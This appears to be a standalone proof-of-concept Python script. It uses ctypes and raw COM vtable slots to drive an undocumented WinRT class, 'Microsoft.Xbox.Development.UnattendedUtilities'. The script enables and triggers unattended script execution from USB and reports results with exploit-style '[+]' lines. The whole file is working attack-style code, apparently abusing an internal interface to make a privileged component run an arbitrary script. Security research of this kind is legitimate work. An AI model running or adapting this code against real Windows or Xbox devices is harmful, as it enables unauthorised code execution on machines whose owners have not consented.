import sys, ctypes
from ctypes import wintypes, c_void_p, c_ulong, c_long, c_wchar_p, POINTER, byref

combase = ctypes.windll.combase
RoInitialize = combase.RoInitialize
RoInitialize.argtypes = [c_ulong]
RoInitialize.restype = c_long

RoGetActivationFactory = combase.RoGetActivationFactory
RoGetActivationFactory.argtypes = [c_void_p, c_void_p, POINTER(c_void_p)]
RoGetActivationFactory.restype = c_long

WindowsCreateString = combase.WindowsCreateString
WindowsCreateString.argtypes = [c_wchar_p, c_ulong, POINTER(c_void_p)]
WindowsCreateString.restype = c_long

WindowsDeleteString = combase.WindowsDeleteString
WindowsDeleteString.argtypes = [c_void_p]
WindowsDeleteString.restype = c_long

class GUID(ctypes.Structure):
    _fields_ = [
        ('Data1', wintypes.DWORD),
        ('Data2', wintypes.WORD),
        ('Data3', wintypes.WORD),
        ('Data4', wintypes.BYTE * 8)
    ]

def make_guid(d1, d2, d3, b_list):
    g = GUID()
    g.Data1 = d1; g.Data2 = d2; g.Data3 = d3
    for i, b in enumerate(b_list): g.Data4[i] = b
    return g

IID_IActivationFactory = make_guid(0x00000035, 0x0000, 0x0000, [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46])
IID_IUnattendedUtilitiesStatics = make_guid(0xde87ad07, 0x75dc, 0x4eec, [0x92, 0x26, 0x56, 0x28, 0xe9, 0x8b, 0x99, 0x14])

RoInitialize(1)
class_name = "Microsoft.Xbox.Development.UnattendedUtilities"
h_class = c_void_p()
WindowsCreateString(class_name, len(class_name), byref(h_class))

p_factory = c_void_p()
RoGetActivationFactory(h_class, byref(IID_IActivationFactory), byref(p_factory))

vtable_factory = POINTER(c_void_p).from_address(p_factory.value)
QueryInterface_proto = ctypes.WINFUNCTYPE(c_long, c_void_p, POINTER(GUID), POINTER(c_void_p))
QueryInterface = QueryInterface_proto(vtable_factory[0])

p_statics = c_void_p()
QueryInterface(p_factory, byref(IID_IUnattendedUtilitiesStatics), byref(p_statics))
vtable_statics = POINTER(c_void_p).from_address(p_statics.value)

# Slot 15: put_ShouldRunOobeScript(boolean shouldRun)
proto_put_bool = ctypes.WINFUNCTYPE(c_long, c_void_p, ctypes.c_byte)
put_ShouldRunOobeScript = proto_put_bool(vtable_statics[15])
hr = put_ShouldRunOobeScript(p_statics, 1)
print(f"[+] put_ShouldRunOobeScript(1): hr={hex(hr & 0xffffffff)}")

# Slot 27: RunUnattendedScriptOnUsbAsync(IAsyncAction** asyncOp)
proto_async = ctypes.WINFUNCTYPE(c_long, c_void_p, POINTER(c_void_p))
RunUnattendedScriptOnUsbAsync = proto_async(vtable_statics[27])
p_async = c_void_p()
hr = RunUnattendedScriptOnUsbAsync(p_statics, byref(p_async))
print(f"[+] RunUnattendedScriptOnUsbAsync: hr={hex(hr & 0xffffffff)}, async_ptr={hex(p_async.value or 0)}")

# Also Slot 9: RetrieveAndRunUnattendedScript(INT32* scriptResultHr, HSTRING* scriptOutput)
proto_run = ctypes.WINFUNCTYPE(c_long, c_void_p, POINTER(c_long), POINTER(c_void_p))
RetrieveAndRunUnattendedScript = proto_run(vtable_statics[9])
script_res = c_long(0)
script_out = c_void_p()
hr = RetrieveAndRunUnattendedScript(p_statics, byref(script_res), byref(script_out))
print(f"[+] RetrieveAndRunUnattendedScript: hr={hex(hr & 0xffffffff)}, exitHr={hex(script_res.value & 0xffffffff)}")
